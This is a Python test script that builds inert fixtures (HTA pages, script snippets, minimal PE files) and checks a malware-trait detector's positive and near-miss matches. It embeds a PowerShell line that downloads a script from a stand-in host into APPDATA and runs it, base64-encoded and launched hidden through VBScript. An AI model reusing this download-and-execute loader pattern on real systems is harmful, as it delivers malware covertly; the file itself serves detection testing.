#!/usr/bin/env python3
"""Generate inert controls and check the reasoned loader review's boundaries."""
import argparse
import base64
import json
from pathlib import Path
import re
import struct
import subprocess

ROOT = Path(__file__).resolve().parents[3]
PAYLOAD = 'wget "http://example.invalid/a.js" -Outfile "$env:APPDATA\\demo.js"; & "$env:APPDATA\\demo.js"'
FETCH = 'objectives/execution/payload/file-exec::encoded-powershell-fetch-run-appdata-script'
HIDE = 'objectives/evasion/process/hidden/window::hidden-obfuscated-appdata-script-downloader'
OPTIONS = 'objectives/execution/interpreter/vbscript/loader::html-vbscript-hidden-encoded-powershell-launch'
CHARS = 'micro-behaviors/data/decode/char-code::vbs-chrw-concat-chain'
HEXCHAR = 'micro-behaviors/data/decode/char-code::vbs-hex-character-code'
DISPATCH = 'micro-behaviors/process/interpreter/powershell/command::encoded-powershell-appdata-script-command'
EC = 'micro-behaviors/process/argument/option::powershell-base64-ec-option'
RICH = 'metadata/binary/header/identity::pe-rich-header-entries'
RSRC = 'metadata/binary/section/entropy::large-near-constant-rsrc-section'


def page(payload=PAYLOAD, ec=True, hidden=True):
    encoded = base64.b64encode(payload.encode('utf-16le')).decode()
    option = '-ec' if ec else '-command'
    # An uncalled procedure prevents accidental activation of these controls.
    return f'''<html><script type="text/vbscript">
Sub FixtureOnly()
Set host = CreateObject(ChrW(&H77) & "Script.Shell")
command = "PowerShell.exe -ex bypass -nop {option} {encoded}"
host.Run Chr(34) & "cmd.exe" & Chr(34) & " /c " & command, {0 if hidden else 1}:
label = ChrW(65) & ChrW(66) & ChrW(67)
End Sub
</script></html>'''


def pe(code, resource=None, rich=True):
    """Minimal PE with no imports; its entry point is an immediate RET."""
    sections = [(b'.text', b'\xc3' + code, 0x60000020)]
    if resource is not None:
        sections.append((b'.rsrc', resource, 0x40000040))
    out = bytearray(0x400)
    out[:2] = b'MZ'
    struct.pack_into('<I', out, 0x3c, 0x100)
    if rich:
        key = 0x12345678
        values = [0x536e6144, 0, 0, 0, 0x01001234, 1]
        struct.pack_into('<6I', out, 0x40, *(x ^ key for x in values))
        out[0x58:0x60] = b'Rich' + struct.pack('<I', key)
    out[0x100:0x104] = b'PE\0\0'
    struct.pack_into('<HHIIIHH', out, 0x104, 0x14c, len(sections), 0,
                     0, 0, 0xe0, 0x102)
    opt = 0x118
    struct.pack_into('<H', out, opt, 0x10b)
    struct.pack_into('<III', out, opt + 16, 0x1000, 0x1000, 0x2000)
    struct.pack_into('<III', out, opt + 28, 0x400000, 0x1000, 0x200)
    struct.pack_into('<HH', out, opt + 40, 4, 0)
    struct.pack_into('<HH', out, opt + 48, 4, 0)
    image_end = 0x1000
    for i, (name, data, flags) in enumerate(sections):
        va = image_end
        raw_size = (len(data) + 0x1ff) & ~0x1ff
        struct.pack_into('<8sIIIIIIHHI', out, opt + 0xe0 + i * 40,
                         name, len(data), va, raw_size, len(out), 0, 0, 0, 0, flags)
        out.extend(data + bytes(raw_size - len(data)))
        image_end = va + ((len(data) + 0xfff) & ~0xfff)
    struct.pack_into('<II', out, opt + 56, image_end, 0x400)
    struct.pack_into('<H', out, opt + 68, 3)
    struct.pack_into('<I', out, opt + 92, 16)
    return bytes(out)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--cleave', default='cleave')
    ap.add_argument('--output-dir', required=True)
    args = ap.parse_args()
    directory = Path(args.output_dir)
    directory.mkdir(parents=True, exist_ok=True)
    cases = []

    def add(name, data, present, absent=()):
        path = directory / name
        path.write_bytes(data.encode() if isinstance(data, str) else data)
        cases.append((path, set(present), set(absent)))

    add('concealed.hta', page(), [FETCH, HIDE, OPTIONS, CHARS, HEXCHAR, DISPATCH, EC])
    add('no-ec.hta', page(ec=False), [CHARS, HEXCHAR, DISPATCH], [FETCH, HIDE, OPTIONS, EC])
    add('visible.hta', page(hidden=False), [CHARS, HEXCHAR, DISPATCH, EC], [FETCH, HIDE, OPTIONS])
    add('download-only.hta', page(PAYLOAD.split(';')[0]), [OPTIONS, EC], [FETCH, HIDE, DISPATCH])
    add('character-only.hta', '<script type="text/vbscript">x=ChrW(&H41) & ChrW(&H42) & ChrW(&H43)</script>',
        [CHARS, HEXCHAR], [OPTIONS, FETCH, HIDE, EC, DISPATCH])
    octal = 'micro-behaviors/data/decode/char-code::shell-printf-octal-substitution-percent-b'
    triplet = 'micro-behaviors/data/decode/char-code::vb-decimal-triplet-character'
    ps_triplet = 'micro-behaviors/data/decode/char-code::powershell-decimal-triplet-byte'
    add('printf-octal.sh', "#!/bin/sh\nprintf '%b' '\\101\\102'\n", [octal])
    add('printf-text.sh', "#!/bin/sh\nprintf '%s' '\\101\\102'\n", [], [octal])
    # The VBS facts producer exposes string constants rather than full source.
    add('vb-triplet.vbs', 'Sub FixtureOnly()\nExecute "x = Chr(CInt(Mid(data, 1, 3)))"\nEnd Sub', [triplet])
    add('vb-pair.vbs', 'Sub FixtureOnly()\nExecute "x = Chr(CInt(Mid(data, 1, 2)))"\nEnd Sub', [], [triplet])
    add('ps-triplet.ps1', '$x = [byte]($data.Substring(0, 3))', [ps_triplet])
    add('ps-pair.ps1', '$x = [byte]($data.Substring(0, 2))', [], [ps_triplet])
    # Vary all pointer operands; the signature must not require specimen addresses.
    code = bytes.fromhex('68 11 22 33 44 52 FF 15 21 32 43 54 8B 8C 24 10 00 00 00 '
                         '8D 84 24 20 00 00 00 68 80 00 00 00 50 6A 02 6A 00 '
                         '68 12 23 34 45 51 FF 15 22 33 44 55')
    add('layout-and-zero-rsrc.exe', pe(code, bytes(32768)), [RICH, RSRC])
    add('layout-and-ff-rsrc.exe', pe(code, b'\xff' * 32768), [RICH, RSRC])
    add('incomplete-layout.exe', pe(code[:-6], bytes(range(256)) * 128, False), [], [RICH, RSRC])
    add('small-rsrc.exe', pe(b'', bytes(16384)), [RICH], [RSRC])
    results = []
    proc = subprocess.run([args.cleave, '--traits-dir', str(ROOT), '--format', 'json',
                           *(str(path) for path, _, _ in cases)],
                          capture_output=True, text=True)
    assert proc.returncode == 0, proc.stderr
    (directory / 'reports.jsonl').write_text(proc.stdout)
    decoder, remaining, files = json.JSONDecoder(), proc.stdout, []
    while remaining.strip():
        item, end = decoder.raw_decode(remaining.lstrip())
        files.extend(item['files'])
        remaining = remaining.lstrip()[end:]
    for path, present, absent in cases:
        findings = {t['id'] for f in files if f['path'] == str(path)
                    for t in f.get('traits', [])}
        missing, unexpected = present - findings, absent & findings
        assert not missing and not unexpected, (path.name, missing, unexpected)
        results.append({'case': path.name, 'present': sorted(present), 'absent': sorted(absent), 'passed': True})
    # Component signatures can be omitted from unreferenced report output.
    # Exercise the actual rule matcher against an inert positive and near miss.
    source = (ROOT / 'well-known/malware/botnet/stormattack/traits.yaml').read_text()
    pattern = re.search(r"pattern: '([^']+)'", source).group(1)
    for name, expected in [('layout-and-zero-rsrc.exe', True), ('incomplete-layout.exe', False)]:
        match = subprocess.run([args.cleave, '--traits-dir', str(ROOT), 'test-match', str(directory / name),
                                '--type', 'hex', '--pattern', pattern, '--section', '.text'],
                               capture_output=True, text=True, check=True)
        assert bool(re.search(r'^MATCHED \(', match.stdout, re.M)) == expected, match.stdout
        results.append({'case': name + ':call-layout', 'matched': expected, 'passed': True})
    (directory / 'results.json').write_text(json.dumps(results, indent=2) + '\n')
    print(f'{len(results)} focused controls passed')


if __name__ == '__main__':
    main()
